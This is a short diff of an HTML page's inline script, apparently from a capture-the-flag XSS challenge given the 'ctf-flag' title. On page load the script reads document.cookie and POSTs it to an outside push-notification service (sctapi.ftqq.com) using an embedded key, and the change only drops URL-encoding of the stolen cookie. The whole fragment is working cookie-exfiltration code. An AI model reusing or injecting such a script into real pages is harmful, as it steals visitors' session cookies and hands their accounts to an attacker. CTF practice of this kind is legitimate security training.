@@ -4,7 +4,7 @@
   <script>
     window.onload = function() {
       var cookie = document.cookie;
-      var url = "https://sctapi.ftqq.com/SCT53295TnUyxqoxn8we7P4tctT1dJF4b.send?title=ctf-flag&desp="+encodeURIComponent(cookie);
+      var url = "https://sctapi.ftqq.com/SCT53295TnUyxqoxn8we7P4tctT1dJF4b.send?title=ctf-flag&desp="+document.cookie;
       
       var xhr = new XMLHttpRequest();
       xhr.open("POST", url, true);
